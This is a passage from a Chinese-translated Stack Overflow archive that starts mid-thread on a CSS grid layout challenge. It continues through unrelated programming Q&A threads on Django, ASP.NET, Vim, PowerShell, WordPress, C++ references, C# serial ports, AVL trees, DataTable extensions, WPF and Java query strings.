> 
> 时间：2009-03-14T03:31:02.817

[![替代文字](https://i.stack.imgur.com/jiwuQ.gif)](https://i.stack.imgur.com/jiwuQ.gif)
[（来源：[sontag.ca](http://sontag.ca/gif/catInHat.gif)）]
我第一次做这个练习是在两年多以前，当时我第一次学习 HTML 和 CSS。我的第一个解决方案就像您在此处看到的那样，只是没有匿名容器 DIV。然后我想到了一个网页，将 CSS 与表格进行并排比较，以证明 CSS 更好。所以我在[挑战](https://web.archive.org/web/20121128141851/http://sontag.ca:80/TheChallenge/)页面上工作，发布了它，然后发布了这个问题。

**山姆·哈斯勒（Sam Hasler**）在几分钟内发布了一个答案，看起来，这真的很接近。我可以看到他正在寻找比我更好的解决方案。他所有的 div 都井井有条，而我的却没有。 **Jacco**发表了一条评论，询问为什么我会使用两个嵌套表。当然，他也是对的。

所以我有两个*荷马辛普森* **“Doh！”** 瞬间。我阅读了有关表格与 CSS 的其他问题和答案。有人提到表格垂直居中。我的答案也没有垂直居中，但我认为这是可能的。毕竟，重点是做一张桌子可以做的所有事情，并且做得更好。我现在已经把自己画在一个角落里，看起来像个傻瓜，所以我*必须*找到答案。

最终（不好意思说它花了多长时间）我想出了下面的解决方案。然后，我能够实现我最初的并排比较网页概念。

这里解释了它是如何工作的以及为什么[你应该使用 CSS](https://web.archive.org/web/20090330024144/http://sontag.ca:80/TheChallenge/CSS%20versus%20Tables.html)

查理的回答...

* * *

```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
 "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">

<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<title>Charlie's CSS layout</title>
<meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
<style type="text/css">

#outer { 
  width:175px; height:175px; 
  text-align:center; 
  font: italic 100%/200% 'Comic Sans MS', cursive;  
  border: 1px solid black;
}
#inner { width: 105px }
#outer>DIV, #inner>DIV { float:left }
#outer>DIV>DIV, #inner>DIV>DIV 
{ display: table-cell;  vertical-align: middle }
#c2 { clear: right }
#c3, #c6 { clear: left }

#c1>DIV, #c4>DIV, #c7>DIV, #c8>DIV, #c9>DIV { height: 35px }
#c2>DIV, #c3>DIV, #c5>DIV, #c6>DIV, #c7>DIV { width:  35px }
#c2>DIV, #c3>DIV { height: 140px } 
#c1>DIV, #c9>DIV { width:  140px } 
#c5>DIV, #c6>DIV { height:  70px } 
#c4>DIV, #c8>DIV { width:   70px } 
#c2, #c6, #c7, #c8, #c9 { position:relative; top:-35px }
#c9 { left: 35px }

#c1 { background-color: silver }
#c2 { background-color: maroon; color: white }
#c3 { background-color: navy; color: white }
#c4 { background-color: red }
#c5 { background-color: blue; color: white }
#c6 { background-color: yellow }
#c7 { background-color: white }
#c8 { background-color: green; color: white }
#c9 { background-color: orange }

/* these rules are a HACK to center vertically in IE7 */
#outer>DIV>DIV, #inner>DIV>DIV { position:relative; }
#c1>DIV, #c4>DIV, #c7>DIV, #c8>DIV, #c9>DIV { top: 10% }
#c5>DIV { top: 0% } 
#c6>DIV { top: 30% }
#c2>DIV { top: 0% }
#c3>DIV { top: 15% }

</style>
</head>
<body>

<div id="outer">
  <div id="c1"><div> 1 </div></div>
  <div id="c3"><div>3<br/>3<br/>3</div></div>
  <div id="inner">
    <div id="c4"><div> 4 </div></div>
    <div id="c5"><div> 5<br/>5 </div></div>
    <div id="c6"><div> 6 </div></div>
    <div id="c7"><div> 7 </div></div>
    <div id="c8"><div> 8 </div></div>
  </div>
  <div id="c2"><div> 2<br/>2<br/>2<br/>2 </div></div>
  <div id="c9"><div> 9 9 9</div></div>
</div>

</body>
</html> 
```

* * *

## 回答 #11

> 赞同：1
> 
> 时间：2009-04-28T19:15:40.280

我认为我们已经证明有不止一种方法可以做到这一点。`table`标签和 CSS 都是可行的选择。

与其添加另一种方式来完成挑战，我只想说，无论它更容易或更难，更简单或更复杂：**HTML 中的表格应该用于显示表格数据。**

*   表格是为表格数据**制作的。**
*   CSS 是**为**样式/演示而设计的。

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2010-01-14T07:22:23.610

这是一个不使用绝对定位的例子，不使用表格单元格，在IE6-8、FF等中有效。

```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
    "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
  <head>
    <meta http-equiv="Content-Type" content="text/html;charset=utf-8" />

<title>Terrible Ted's Table Layout</title>
<style type="text/css">
#box{border:1px solid #000; width:175px; height:175px; color:navy; font-family:"Comic Sans MS"; font-size:13px; font-style:italic; text-align:center;}

div {float:left}

#c1, #c3, #c4, #c7, #c8, #c9{height:35px; line-height:35px}
#c2, #c3{height:140px;line-height:140px}
#c5, #c6{height:70px; line-height:70px}

#c1, #c9{width:140px}
#c2, #c3, #c5, #c6, #c7{width:35px}
#c4, #c8{width:70px}

#c6, #c7 {margin-top:-35px}

#c1{background-color:silver}
#c2{background-color:maroon; float:right}
#c3{background-color:navy}
#c4{background-color:red}
#c5{background-color:blue}
#c6{background-color:yellow}
#c7{background-color:white}
#c8{background-color:green}
#c9{background-color:orange}

</style>
</head>
<body>
<div id="box">
<div id="c1">1</div>
<div id="c2">2</div>
<div id="c3">3</div>
<div id="c4">4</div>
<div id="c5">5</div>
<div id="c6">6</div>
<div id="c7">7</div>
<div id="c8">8</div>
<div id="c9">9</div>
</div>
</body>
</html> 
```

# django-models - Django 模型 - FK 默认为最后输入的记录（由登录用户）

> ID：636713
> 
> 赞同：2
> 
> 时间：2009-03-11T23:03:13.707
> 
> 标签：django-models

我有 2 个模型有问题。其中的 JobRecord 有很多 Activity(ies)，fk 当然放在 Activity 模型中。

为了帮助输入数据，我想在一个新活动中将 fk 默认为 JobRecord，由登录用户默认为“上次输入活动的 JobRecord fk（奖励积分！）”

这是模型：

```
class Activity(models.Model):
    """
    Record multiple activities against a JobRecord
    """

    start               = models.TimeField(blank=True, null=True)
    end                 = models.TimeField(blank=True, null=True)
    job_record          = models.ForeignKey(JobRecord) # editable=False)
    task                = models.ForeignKey(Task, blank=True, null=True) # show only tasks found in project
    flora               = models.ManyToManyField(Species, blank=True, null=True, help_text='Optional subject flora.')

    memo                = models.TextField(blank=True, null=True)

    all_operators       = models.BooleanField(help_text="Check to include all operators from the parent job record")
    operators           = models.ManyToManyField(User, null=True, blank=True)

    duration            = models.DecimalField(blank=True, null=True, max_digits=7, decimal_places=2)

    class Meta:
        #order_with_respect_to = 'job_record' # not working?
        ordering = ['-job_record__date', 'job_record', 'start'] 
```

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-03-12T00:12:28.457

作为第一步，您应该在某个模型中存储每个用户的最后一个活动。

```
class ActivityLog(models.Model)
    user = models.ForeignKey(User)
    job_record = models.ForeignKey(JobRecord) 
```

然后在视图中，您可以通过一些简单的查询来检索活动：

```
last_activity_data = ActivityLog.objects.filter(user=request.user) 
```

并将其用于初始化模型的表单：

```
form = ActivityForm(job_record=last_activity_data.job_record) 
```

最后，记得在保存Activity的时候更新日志。

注意：我省略了所有的错误检查；例如，您应该注意没有`last_job_record`'s 的情况，但这应该是微不足道的。

最后，你也可以对Activity使用ManyToManyField，然后使用Django的API；这将是完全等价的（例如，它将在幕后创建一个与此非常相似的表），但我认为语义会略有不同，因此我更喜欢显式解决方案。

# javascript - ASP.Net、拖放、回发和控件 ID

> ID：636714
> 
> 赞同：0
> 
> 时间：2009-03-11T23:03:15.690
> 
> 标签：javascript, asp.net-ajax, user-controls, updatepanel

标题试图总结问题，但这里有一个更详细的总结：我们的网页是用户控件的集合，它们在视觉上呈现为矩形报告小部件，这些小部件设置在 AJAX 更新面板中。我们让用户能够拖放小部件以在页面上预设“区域”。

拖放功能工作正常。我们使用对 Web 服务的 AJAX 调用来使用用户的新设置更新数据库以实现持久性。

当我们从这些小部件之一进行回发时，就会发生“然而”。回发被发送到服务器，它呈现一个更新，该更新被发送回客户端（所有通过 AJAX，因为更新面板）。然后，我们在客户端上收到“找不到带有 ID...的 UpdatePanel”消息，因为文档层次结构已更改，但客户端上的控件 ID 尚未更新。

我们尝试了 Rick Strahl 对此[链接文本](http://www.west-wind.com/WebLog/posts/4605.aspx "（链接在这里）")的解决方案，它允许我们在客户端上创建静态控件 ID。这破坏了回发功能，但是...... isPostBack 属性未设置，我假设是因为服务器无法将控件 ID 与已知的层次结构元素匹配。

我们正在考虑在客户端拖放后使用 Javascript 重置控件 ID。显然，这需要复制 .Net 的命名算法——我们认为这并不聪明。也许我们可以使用一个单独的更新面板并要求服务器在它被删除后向我们发送新的控件 ID？

显然，我们的想法已经不多了。

我意识到这可能太长了，我会很乐意编辑、提供代码示例等来帮助您帮助我们。先感谢您。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-03-11T23:18:37.367

您可以使用 ASp.Net 的内置系统来处理称为 WebParts 的可拖动页面元素。

该系统适用于回发，并且可以使用 Visual Studio 轻松实现

搜索 webparts 教程，例如：

[http://www.ondotnet.com/pub/a/dotnet/2005/01/10/liberty.html](http://www.ondotnet.com/pub/a/dotnet/2005/01/10/liberty.html)

希望这可以帮助

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-03-11T23:38:08.320

只是出于兴趣，您是否检查过回发的 UpdatePanel 的 id，并且该 id 是预期的吗？您可以像这样挂钩到 ASP.NET AJAX 的[客户端页面生命周期](http://www.asp.net/ajax/documentation/live/overview/AJAXClientEvents.aspx)，以检查启动回发的控件的 id

```
<script type="text/javascript">

  function pageLoad(sender, args)
  {
      var prm = Sys.WebForms.PageRequestManager.getInstance();

      prm.add_initializeRequest(InitializeRequest);
      prm.add_endRequest(EndRequest);

      //fires when an async postback is initialized
      function InitializeRequest(sender, args) 
      {
        alert(args._postBackElement.id)
      }

      //fires when an async postback is complete
      function EndRequest(sender, args) 
      {
        alert(sender._postBackSettings.sourceElement.id)
      }
  }

</script> 
```

# vi - 如何在 .vimrc 中检测 vi（不是 vim）？

> ID：636721
> 
> 赞同：20
> 
> 时间：2009-03-11T23:05:38.070
> 
> 标签：vi, vim

我将 vimrc 带到我工作的所有机器上，它自然包含旧 vi 中不存在的选项。

如果我不小心在 vi 不是 vim 的别名和/或未安装 vim 的机器上启动了 vi 会话，vi 会读取 vimrc 并抛出一堆烦人的错误，让我知道该选项不支持。

我知道我总是可以输入“vim”而不是“vi”并将 EDITOR 变量设置为 vim（对于 visudo 等......），但是我可以在 vimrc 的顶部添加一行退出脚本如果文件被vi读取，那么早吗？

* * *

## 回答 #1

> 赞同：39
> 
> 时间：2009-03-11T23:13:39.423

如果 vi 实际上不是 vim 的链接，则不应读取**.vimrc**，而应读取**.exrc**。它正在读取 .vimrc 的事实表明它实际上是 vim 的早期版本。如果是这种情况，您可以使用 vim "if" 构造来支持新功能，如下所示：

```
:if version >= 500
:  version-5-specific-commands
:endif 
```

类型：

```
:help if 
```

在 vim 中获取更多信息时。

* * *

## 回答 #2

> 赞同：14
> 
> 时间：2009-06-29T11:22:47.047

如果您想更具体地检查您的检查，您也可以检查个别功能。

我的 .vimrc 中有这个：

```
if has("eval")
    " Syntax stuff
    let java_highlight_all=1
endif

if has("autocmd")
    " Buffers
    autocmd BufEnter * cd %:p:h
endif 
```

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2009-03-11T23:14:36.287

非 vim 不读取 .vimrc，它正在寻找 .exrc。您可以使用 "if version >= 500" 检测旧版本的 vim

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2013-02-10T01:33:22.580

"vi" 读取 vimrc 因为它肯定是用名称 "vi" 编译的 Vim。并且它可能编译为“非常兼容 Vi”，因此您可以尝试检查功能“兼容”以检测“vi”：

```
if !has("compatible")
   let g:loaded_matchparen=1
   syntax off
endif 
```

# c# - C#中的Powershell Sqlcmd弹出窗口

> ID：636722
> 
> 赞同：1
> 
> 时间：2009-03-11T23:05:42.563
> 
> 标签：c#, sql-server, powershell, sqlcmd, pshost

我有一个 PSHost 对象执行 Powershell 脚本 myscript.ps1 并且 .ps1 脚本正在执行 sqlcmd.exe 以完成它需要完成的工作。有没有办法让它不弹出空的 sqlcmd dos 提示（就像它看起来那样）？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-03-13T16:53:57.170

例如：http: [//blog.sapien.com/index.php/2006/12/26/more-fun-with-scheduled-powershell](http://blog.sapien.com/index.php/2006/12/26/more-fun-with-scheduled-powershell)

您将不得不将 sqlcmd.exe 包装在其他东西中，因为 PowerShell 无法进行 AFAIK。

从脚本的角度来看，这对于 v2 中的 powershell.exe 确实有所改变，但我不确定 SDK 是否可以用于自定义主机。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2011-11-29T20:02:08.913

而不是调用 sqlcmd.exe 为什么不直接调用安装 SSMS 时附带的 Invoke-SQLCmd cmdlet？

# wordpress - wordpress 主题的设计和编码策略？

> ID：636753
> 
> 赞同：1
> 
> 时间：2009-03-11T23:20:14.807
> 
> 标签：wordpress, themes

对于创建 wordpress 主题，人们通常采用这两种方法之一

1.  在 Photoshop 或类似工具中设计 Mockup 并从头开始编写 HTML 和 CSS
2.  选择一个基本主题并设计模型，牢记基本主题并在所选基本主题上编写代码。

在处理 Wordpress 主题创建方面，这些（或除这些之外的任何其他方法）哪个是更好的方法？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-03-14T18:37:28.420

这取决于您要完成的工作。我使用选项 1 进行学习和开发，使用选项 2 作为收集想法的一种方式。

主要原因是 Photoshop 模型，无论您要求设计师遵循现有模板多近，“通常”都会在某些方面有所不同，因此当您进入主题中间时，您会发现您可以修改的现有模板并不能完成客户要求的一切（除非客户是亲戚，在这种情况下您可能会说太糟糕了）。

另一个原因是调用范围蔓延。这意味着所呈现的原始范围现在已经超出了您的主题。然后，您将不得不问自己是否可以深入研究其他人的代码并弄清楚他们想要做什么，然后看看您是否可以将其破解到足以满足您客户的新要求，或者您是否更适合从从头开始，然后当范围蔓延出现时，您知道该去哪里/做什么以满足他们的要求。

无论如何，要考虑的事情。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-03-11T23:27:31.370

这实际上取决于您的公司/客户的要求。如果他们有一个主题无法轻易满足的特定要求，那么使用选项#1 可能会更好。如果他们要求提交设计，并将实施/设计留给您，请使用选项 #2。

一些优质的 wordpress 主题非常好。请注意，对于这两种工具，您都将在 Photoshop 中制作模型，因此请从该模型开始，看看您的公司/客户的想法。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-03-11T23:49:23.487

您可能希望使用现有主题作为新主题的基础，或者至少作为参考，以了解要调用哪些 Wordpress Codex 函数来检索要在主题中使用的数据。

HTML/CSS 设计只是解决方案的一半——您仍然需要从 WP 中检索数据才能显示。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-03-16T17:00:53.707

使用 Sandbox 来开始你的主题，它是免费的，它为你提供了很多课程来做很多你看到的设计技巧是很棒的 wordpress 主题。

[http://www.plaintxt.org/themes/sandbox/](http://www.plaintxt.org/themes/sandbox/)

另一个伟大的主题是论文： [http ://diythemes.com/thesis/](http://diythemes.com/thesis/)

从长远来看，我总是从一个能让我做事更轻松的主题开始。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2011-02-04T01:27:14.833

我总是从 Naked 主题开始（比如[Starkers](http://starkerstheme.com/)，Elliot Jay Stocks 的），否则从头开始构建一切。

如果您想节省时间，或者不是（并且不想变得）非常熟悉 Wordpress PHP 逻辑，那么我将从现有主题开始。

# c++ - 如何将 const ref a 返回到 C++ 中的局部变量？

> ID：636755
> 
> 赞同：4
> 
> 时间：2009-03-11T23:21:34.257
> 
> 标签：c++, boost

我有一个无法更改函数参数的函数。我需要返回对此函数中创建的 std::string 的 const 引用。我尝试使用 boost shared_ptr，但这不起作用。为什么？我该如何进行这项工作？

```
const std::string& getVal(const std::string &key) {
  boost::shared_ptr<std::string> retVal(new std::string());
  ... //build retVal string with += operator based on key
  return *retVal;
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-03-11T23:25:29.100

您不能使用 c++ 从函数返回对局部变量的引用。尽管在 c++0x 中这是可能的。

**在堆上分配字符串，稍后手动清理：**

如果您无法更改函数的接口，则需要在堆上创建它，然后手动删除它。

```
//Remember to free the address that getVal returns
const std::string& getVal(const std::string &key) {
  std::string *retVal = new std::string();
  ... //build retVal string with += operator based on key
  return *retVal;
} 
```

**相同的解决方案，但不是手动：**

由于如果您忘记手动释放它，上述内容最终会导致内存泄漏。我建议将此调用包装到一个类中并使用 RAII。即在构造函数中，调用getVal 并设置该类的一个成员指向它。在你的类的析构函数中，你会删除它。

**为什么您使用 shared_ptr 提供的代码不起作用：**

shared_ptr 通过引用计数工作。由于您正在销毁唯一的 shared_ptr 对象（按范围），因此没有剩余引用，内存将被释放。要让它工作，你必须返回一个 shared_ptr，但你说你不能这样做。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-03-11T23:27:40.497

您需要返回 boost shared_ptr，而不是 std::string。一旦函数退出，堆栈上的 shared_ptr 就会超出范围，因为只有一个引用，它将被删除。您还需要返回副本而不是参考。

您永远不应该返回对堆栈变量的引用，因为一旦函数存在，它将被删除。

如果您无法更改返回类型，那么唯一（棘手的）选项是在堆上分配字符串，返回对指针的引用，并确保调用代码知道它是一个指针，然后将其删除。

例如

```
const std::string& getVal(const std::string &key) {
  return *(new std::string("Something"));
}

// get the val, remember we must delete this pointer!
std::string* pString = &getVal("SomeKey");
delete pString; 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-03-11T23:27:41.607

这不是一个提升问题。您不能返回对局部变量的引用，因为一旦函数终止，该变量将不复存在。在这种情况下，您应该真正返回一个值。但是，您可以使用的一种技巧是将局部变量设为静态，但这很可能会导致并发和其他问题。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-03-11T23:52:30.423

由于您无法更改函数的签名，因此您可以返回对静态变量的引用：

```
const std::string& getVal(const std::string &key) {
    static std::string retVal;
    ... //build retVal string with += operator based on key
    return retVal;
} 
```

但是，这种方法存在严重问题。它本质上不是线程安全的。即使您的应用程序不是多线程的，它也可能导致问题，具体取决于调用者保留引用的时间。

如果您的应用程序不是多线程的，并且每次调用 getVal() 都会立即使用或复制该字符串，那么您可能可以侥幸逃脱。但我强烈建议只返回一个 std::string。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-03-12T13:48:02.520

由于您想要的是 const 引用，因此您可以按值返回并使调用者使用 const 引用接收它。

[草本萨特 GotW 88](http://herbsutter.wordpress.com/2008/01/01/gotw-88-a-candidate-for-the-most-important-const/)

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-03-12T14:07:05.657

要考虑的另一点是，如果可能，该标准允许编译器优化掉副本。该标准将此称为*复制省略*，但大多数人将其称为“命名返回值优化”，请参见[此处](http://www.efnetcpp.org/wiki/Return_value_optimization)。

基本概念是编译器将在可能的情况下将本地对象直接构造到作为函数调用结果的对象上：

```
class A {};

A foo () {
  A a;          // #1
  return a;
}

void bar () {
  A b = foo();  // #2
} 
```

在上面的示例中，'a' 将被构造在与 bar 中的 'b' 相同的位置，因此当函数返回时，根本不需要任何副本。总之，测试您的编译器以查看它是否执行此优化可能是值得的。如果您有兴趣，这个标准参考是 12.8/15。

# c# - Serial Port ReadLine vs ReadExisting 或如何正确地从串口读取数据

> ID：636758
> 
> 赞同：15
> 
> 时间：2009-03-11T23:25:27.523
> 
> 标签：c#, compact-framework, serial-port, windows-ce

我正在从串口读取数据。数据超出规模。即使`Readline()`在删除`DiscardInBuffer()`.

从串口读取数据的正确方法是什么？网上的例子太少了，我觉得这就像一个没有人发现的圣杯。

C#、WinCE 5.0、HP 瘦客户端、Compact 框架 2.0

```
 private void WeighSample()
    {
        this._processingDone = false;
        this._workerThread = new Thread(CaptureWeight);
        this._workerThread.IsBackground = true;
        this._workerThread.Start();
    } //end of WeighSample()

    private void CaptureWeight()
    {
         globalCounter++;
         string value = "";

          while (!this._processingDone)
          {
              try
              {

                 value = this._sp.ReadLine();

                  if (value != "")
                  {
                      if (value == "ES")
                      {
                          _sp.DiscardInBuffer();
                          value = "";
                      }
                      else
                      {
                          this.Invoke(this.OnDataAcquiredEvent, new object[] { value });
                      }
                  }
              }
              catch (TimeoutException)
              {
                  //catch it but do nothing
              }
              catch
              {
                  //reset the port here?
                  MessageBox.Show("some other than timeout exception thrown while reading serial port");
              }
          }

    } //end of CaptureWeight() 
```

关于我的应用程序要注意的一件事是，当光标跳到文本框上时，我启动了线程 (weighSample)。原因是重量也可以手动输入（部分要求）。所以我事先不知道用户是要按天平上的 PRINT 还是输入重量。无论哪种情况，在获取数据后，我都会退出工作线程。另外，请注意我没有使用串行端口事件 DataReceived，因为我被告知它不可靠。

这是我第一次使用串口。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2009-03-11T23:52:21.670

取决于输入数据的行尾 (EOL) 字符。如果您的数据是面向行的，则 ReadLine 是一个可以使用的有效函数，但您可能需要查看 NewLine 属性并确保它已针对您的输入数据进行了适当的设置。

例如，如果您的秤为 EOL 输出换行，则设置`port.NewLine = "\n";`

[http://msdn.microsoft.com/en-us/library/system.io.ports.serialport.newline.aspx](http://msdn.microsoft.com/en-us/library/system.io.ports.serialport.newline.aspx)

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2009-03-12T12:58:56.617

我*从来没有*在 ReadLine 上工作过。只需在数据可用时读取本地缓冲区，然后使用单独的线程扫描数据并自己查找换行符。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2015-07-17T11:58:56.060

```
if (serialPort1->IsOpen){
    if (serialPort1->BytesToRead>0){
        this->textBox1->Text += serialPort1->ReadExisting();
    }
} 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2016-06-28T09:00:50.290

我正在添加一个答案来回应 Elias Santos。使用 ReadExisting 方法有一些陷阱：

[https://msdn.microsoft.com/en-us/library/system.io.ports.serialport.readexisting(v=vs.110).aspx](https://msdn.microsoft.com/en-us/library/system.io.ports.serialport.readexisting(v=vs.110).aspx)

> 请注意，此方法可能会在内部缓冲区中留下尾随前导字节，这会使 BytesToRead 值大于零。

我之前遇到过 ReadExisting 的一些问题，这是因为不需要的字节。使用 Readline 解决了这些问题。

# avl-tree - 您将如何实现具有延迟删除的平衡树？

> ID：636759
> 
> 赞同：2
> 
> 时间：2009-03-11T23:25:28.897
> 
> 标签：avl-tree

更具体地说，是 AVL 树。可能吗？我想这样做，但我认为未删除的节点可能难以管理旋转。

我有一个可以正常工作的，但我想用这个延迟删除来做其他事情。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-03-11T23:34:25.973

如果您希望它相对于所有节点（包括标记为已删除的节点）保持“平衡”，您无需做任何事情——您已经在那里了。

如果您希望它相对于未删除的节点集保持“平衡”——问题是*为什么？* 平衡的重点是防止失控（线性最坏情况）搜索，这取决于节点，而不是它们的删除状态。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-03-28T11:34:08.467

在 AVL 树的上下文中，不删除到底*意味着什么？*

这可能意味着您不*进行*删除操作，也就是说，您根本不更新树。

这将导致树不正确地重新平衡，因为向上扫描平衡因子将使用不正确的平衡因子。

这可能意味着更新平衡因素但不平衡。

这意味着当您决定删除某些内容时，您最终会得到大于 2 或小于 -2 的平衡因子；这意味着要纠正多次旋转。但是这里的问题是，在旋转时，您不再知道您是否已经消除了子树深度。因为尽管您知道一侧的 3 个子树深度太多，但您不再知道正是一个元素导致了每个级别的额外深度 - 您通常知道这一点，因为您一次添加或删除单个元素- 所以你不知道你需要做多少次旋转。您可能进行了 3 次旋转并且只丢失了一个子树深度，因为在该深度有两个元素。事实上，你怎么会*知道*要旋转哪些元素以获得必要的元素？它们不一定都存在于您选择的删除元素和平衡因子为 3 的路径中。

我不确定，但我会冒险说惰性删除会破坏我们所知道的 AVL。

无论如何，你为什么要拖延？AVL 的重点是在每次添加/删除时分摊重新平衡成本，因此您保持在 O(log n) - 为什么要为更大、更不频繁的重新平衡建立重新平衡债务？

# .net - 如何处理 System.Data.DataTableExtensions.CopyToDataTable() 中的缺陷

> ID：636765
> 
> 赞同：8
> 
> 时间：2009-03-11T23:27:46.987
> 
> 标签：.net, vb.net, linq, extension-methods

我遇到了一些可能是 Extension 方法中的缺陷`.CopyToDataTable`。

此方法由 Importing（在 VB.NET 中）使用`System.Data.DataTableExtensions`，然后针对 IEnumerable 调用该方法。如果您想使用 LINQ 过滤数据表，然后在最后恢复数据表，您可以这样做。

IE：

```
Imports System.Data.DataRowExtensions
    Imports System.Data.DataTableExtensions

    Public Class SomeClass
            Private Shared Function GetData() As DataTable
                Dim Data As DataTable

                Data = LegacyADO.NETDBCall

                Data = Data.AsEnumerable.Where(Function(dr) dr.Field(Of Integer)("SomeField") = 5).CopyToDataTable()

                Return Data

            End Function
    End Class 
```

在上面的示例中，“WHERE”过滤可能不返回任何结果。如果发生这种情况，CopyToDataTable 会抛出异常，因为没有 DataRows。

为什么？

正确的行为应该是返回 Rows.Count = 0 的 DataTable。

谁能想到一个干净的解决方法，这样调用 CopyToDataTable 的人就不必知道这个问题？

System.Data.DataTableExtensions 是一个静态类，因此我无法覆盖该行为。有任何想法吗？我错过了什么吗？

更新：

我已将此作为问题提交给[Connect](https://connect.microsoft.com/VisualStudio/feedback/ViewFeedback.aspx?FeedbackID=422727)。我仍然想要一些建议，但如果你同意我的观点，你可以通过上面的链接在 Connect 上投票赞成这个问题

干杯

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2010-03-11T17:40:02.623

```
someDataTable.AsEnumerable().Where(r => r.Field<string>("SomeField") == "SomeValue").AsDataView().ToTable(); 
```

`.AsDataView().ToTable()`返回一个空表，其结构与`someDataTable`现在返回的行相同`.Where()`

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-03-17T04:12:20.020

在 Microsoft 解决此问题之前，这里有一个解决方法：

创建您自己的扩展方法，如果有 DataRows，则使用 CopyToDataTable 方法，如果没有，则返回一个空的 DataTable。

VB.NET

```
 Imports System.Data

Namespace CustomExtensions
    Public Module DataRowExtensionsOverride

        <System.Runtime.CompilerServices.Extension()> _
        Public Function CopyToDataTableOverride(Of T As DataRow)(ByVal Source As EnumerableRowCollection(Of T)) As DataTable

            If Source.Count = 0 Then
                Return New DataTable
            Else
                Return DataTableExtensions.CopyToDataTable(Of DataRow)(Source)
            End If

        End Function

    End Module
End Namespace 
```

C＃;

```
public static class DataRowExtensionsOverride
    {

        public static DataTable CopyToDataTableOverride<T>(this IEnumerable<T> Source) where T : DataRow {

            if (Source.Count() == 0) {
                return new DataTable();
            } else {
                return DataTableExtensions.CopyToDataTable<T>(Source);
            }
        }
    } 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2010-06-21T22:32:38.750

我今天遇到了这个问题，如果有帮助，我想出了一个[解决方法。](http://dommyzee.blogspot.com/2010/06/how-to-get-row-count-for.html)

Sorry, but the blog is in C#, but I just used an IEnumerable on the LINQ variable and check .Current to see if it had returned any rows.

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2017-01-11T05:01:12.557

```
DataTable SearchDT = (DataTable)ViewState["SearchDT"];
DataTable NewDT = SearchDT.Select("BSerialNo='" + SerialNo + "' and BBranch='" + Branch + "' and Warehouse='" + WareHouse + "' and Buffer_ModelNo='" + PartNo + "'").CopyToDataTable();
//  first get an array of DataRows '
if ((NewDT.Rows.Count > 0))
{
    //first check to see if the array has rows
    DataTable dt = NewDT;
    PopUpGrdView.DataSource = dt;
    PopUpGrdView.DataBind();
    //dt now exists and contains rows
} 
```

# wpf - WPF：列表框，值转换器

> ID：636766
> 
> 赞同：2
> 
> 时间：2009-03-11T23:28:22.413
> 
> 标签：wpf, listbox, ivalueconverter

将 valueconverter 与列表框一起使用的最简单方法是什么？

我在运行时将 ItemSource 设置为 List<> 对象，它显示来自 ToString() 方法的文本字符串。不过，我想要的是通过 valueconverter 传递对象以获得完全不同的字符串值。

我发现的所有示例都大量将列表绑定到 xaml 中的某些内容，并定义样式和模板以重新设计整个框，但我只想转换我的值......

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2009-03-11T23:34:39.793

使用具有以下内容的数据模板：

```
<ListBox.ItemTemplate>
    <DataTemplate>
        <TextBlock Text="{Binding Converter=....}" />
    </...> 
```

就是这样。当您没有在绑定中指定路径时，它只是绑定到当前对象。

# java - 是否有任何与 PHP 的 http_build_query 函数等效的 Java？

> ID：636770
> 
> 赞同：9
> 
> 时间：2009-03-11T23:29:51.927
> 
> 标签：java, php, http, build

我有一个包含我的数据的 Map 并想用它构建一个查询字符串，就像我在 PHP 上使用 http_build_query 一样。我不确定这段代码是否是它的最佳实现，或者我是否忘记了什么？

```
public String toQueryString(Map<?, ?> data) throws UnsupportedEncodingException {
    StringBuffer queryString = new StringBuffer();

    for (Entry<?, ?> pair : data.entrySet()) {
        queryString.append ( URLEncoder.encode ( (String) pair.getKey (), "UTF-8" ) + "=" );
        queryString.append ( URLEncoder.encode ( (String) pair.getValue (), "UTF-8" ) + "&" );
    }

    if (queryString.length () > 0) {
        queryString.deleteCharAt ( queryString.length () - 1 );
    }

    return queryString.toString ();
} 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2009-03-22T14:16:11.917

查看[QueryStringBuilder](http://code.google.com/p/workingonit/source/browse/addenda/src/main/java/org/workingonit/addenda/http/QueryStringBuilder.java)类及其[测试类](http://code.google.com/p/workingonit/source/browse/addenda/src/test/java/org/workingonit/addenda/http/QueryStringBuilderTest.java)：

```
private String httpBuildQuery(Map<String, String> data)
        throws UnsupportedEncodingException {
    QueryStringBuilder builder = new QueryStringBuilder();
